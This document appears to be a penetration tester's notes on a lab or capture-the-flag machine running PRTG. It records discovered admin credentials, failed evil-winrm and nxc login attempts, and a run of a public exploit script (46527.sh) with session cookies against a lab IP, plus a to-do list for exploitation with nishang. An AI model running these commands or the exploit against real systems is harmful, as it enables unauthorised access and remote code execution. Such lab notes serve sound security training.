


### Creds

```powershell

	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
	      
	      
```


# 


# Attempts

```powershell

# Failed: 
evil-winrm -i '10.129.230.176' -u 'prtgadmin' -p 'PrTg@dmin2018' 

# Failed

nxc smb 10.129.230.176 -u 'prtgadmin' -p 'PrTg@dmin2018'  --shares
```


# Exploit

![[Pasted image 20251211222519.png]]



# Fix the exploit

```powershell

# get the cookie values after authenticating to the webserver:
./46527.sh -u http://10.129.230.176 -c "_ga=GA1.4.964298405.1765506597; _gid=GA1.4.218903026.1765506597; OCTOPUS1813713946=ezg4REI1NTJDLUU5OEUtNEFEOS1BQjVDLUVBNzE1NEYxMUExMX0%3D; _gat=1"
```


Running the exploit successfully:

![[Pasted image 20251211223916.png]]


# TODO

- FTP enum
- Exploit notification system + nishang
- xclip 